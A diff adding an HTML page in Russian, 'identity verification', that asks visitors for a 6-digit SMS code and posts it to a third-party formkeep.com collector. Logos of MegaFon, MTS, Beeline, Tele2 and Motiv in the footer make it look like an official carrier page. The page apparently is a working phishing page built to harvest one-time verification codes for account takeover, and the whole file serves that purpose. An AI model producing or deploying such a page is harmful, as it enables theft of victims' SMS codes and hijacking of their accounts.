@@ -1,0 +1,156 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Введите 6-значный код из SMS</title>
+<style>
+  body {
+    margin: 0;
+    padding: 0;
+    font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+    background-image: url('https://img.freepik.com/free-vector/paper-style-white-monochrome-background_52683-66443.jpg?w=740&t=st=1708797337~exp=1708797937~hmac=9623b9a47d55c05396ddf31351a1f1d0854b3fcd2a9a8e6f13999bc45f4bb846');
+    background-size: cover;
+    background-repeat: no-repeat;
+    display: flex;
+    flex-direction: column;
+    justify-content: center;
+    align-items: center;
+    min-height: 100vh;
+    color: #000;
+  }
+  h1 {
+    font-size: 24px;
+    font-weight: bold;
+    margin-bottom: 20px;
+  }
+  .content {
+    background-color: rgba(255, 255, 255, 0.5);
+    padding: 20px;
+    border-radius: 10px;
+    box-shadow: 0px 0px 10px rgba(0, 0, 0, 0.5);
+    text-align: center;
+  }
+  .input-group {
+    display: flex;
+    justify-content: center;
+    align-items: center;
+    margin-bottom: 20px;
+  }
+  .digit-input {
+    width: 40px;
+    height: 40px;
+    margin: 5px;
+    padding: 5px;
+    border-radius: 5px;
+    border: 1px solid #ccc;
+    font-size: 16px;
+    text-align: center;
+  }
+  .continue-button {
+    display: inline-block;
+    padding: 10px 20px;
+    background-color: #4CAF50;
+    color: #fff;
+    border: none;
+    border-radius: 5px;
+    cursor: pointer;
+  }
+  .continue-button:hover {
+    background-color: #45a049;
+  }
+  footer {
+    margin-top: auto;
+    display: flex;
+    justify-content: space-around;
+    align-items: center;
+    width: 100%;
+    height: 100px;
+    background-color: rgba(0, 0, 0, 0.5);
+  }
+  footer img {
+    width: 80px;
+    height: auto;
+    cursor: pointer;
+  }
+
+  /* Медиа-запрос для мобильных устройств */
+  @media only screen and (max-width: 600px) {
+    h1 {
+      font-size: 20px;
+    }
+    .content {
+      padding: 15px;
+    }
+  }
+</style>
+</head>
+<body>
+  <h1>Проверка личности</h1>
+
+  <div class="content">
+    <h2>Введите 6-значный код из SMS</h2>
+  
+    <form id="code-form" action="https://formkeep.com/f/2b0474ff71a0" method="POST">
+      <div class="input-group">
+        <input class="digit-input" type="text" name="digit1" maxlength="1" pattern="[0-9]" required autofocus>
+        <input class="digit-input" type="text" name="digit2" maxlength="1" pattern="[0-9]" required>
+        <input class="digit-input" type="text" name="digit3" maxlength="1" pattern="[0-9]" required>
+        <input class="digit-input" type="text" name="digit4" maxlength="1" pattern="[0-9]" required>
+        <input class="digit-input" type="text" name="digit5" maxlength="1" pattern="[0-9]" required>
+        <input class="digit-input" type="text" name="digit6" maxlength="1" pattern="[0-9]" required>
+      </div>
+      <button type="submit" class="continue-button">Продолжить</button>
+    </form>
+    <div id="error-message" style="display: none; color: red; margin-top: 10px;"></div>
+  </div>
+  
+  <footer>
+    <a href="https://www.megafon.ru" target="_blank"><img src="https://upload.wikimedia.org/wikipedia/commons/9/95/MegaFon_sign%2Blogo_horiz_green_RU_%28RGB%29.svg" alt="Мегафон"></a>
+    <a href="https://www.mts.ru" target="_blank"><img src="https://upload.wikimedia.org/wikipedia/commons/thumb/8/86/MTS_logo_2015.svg/1920px-MTS_logo_2015.svg.png" alt="МТС"></a>
+    <a href="https://www.beeline.ru" target="_blank"><img src="https://upload.wikimedia.org/wikipedia/commons/7/7a/BeeLine_logo.png" alt="Билайн"></a>
+    <a href="https://www.tele2.ru" target="_blank"><img src="https://upload.wikimedia.org/wikipedia/commons/6/69/Tele2_logo.svg" alt="Теле2"></a>
+    <a href="https://www.motivtelecom.ru" target="_blank"><img src="https://upload.wikimedia.org/wikipedia/ru/0/0b/Motiv_logo.png" alt="Мотив"></a>
+  </footer>
+
+  <script>
+    const form = document.getElementById('code-form');
+    const inputs = document.querySelectorAll('.digit-input');
+
+    form.addEventListener('submit', function(event) {
+      let valid = true;
+      inputs.forEach(input => {
+        if (!input.value.trim()) {
+          valid = false;
+        }
+      });
+      if (!valid) {
+        event.preventDefault();
+        const errorMessage = document.getElementById('error-message');
+        errorMessage.textContent = 'Поле для ввода пустое, введите корректные данные!';
+        errorMessage.style.display = 'block';
+        setTimeout(() => {
+          errorMessage.style.display = 'none';
+        }, 3000);
+      }
+    });
+
+    inputs.forEach((input, index) => {
+      input.addEventListener('input', function() {
+        if (this.value.length >= 1) {
+          if (index < inputs.length - 1) {
+            inputs[index + 1].focus();
+          }
+        }
+      });
+      input.addEventListener('keydown', function(event) {
+        if (event.key === 'Backspace') {
+          if (this.value.length === 0 && index > 0) {
+            inputs[index - 1].focus();
+          }
+        }
+      });
+    });
+  </script>
+</body>
+</html>
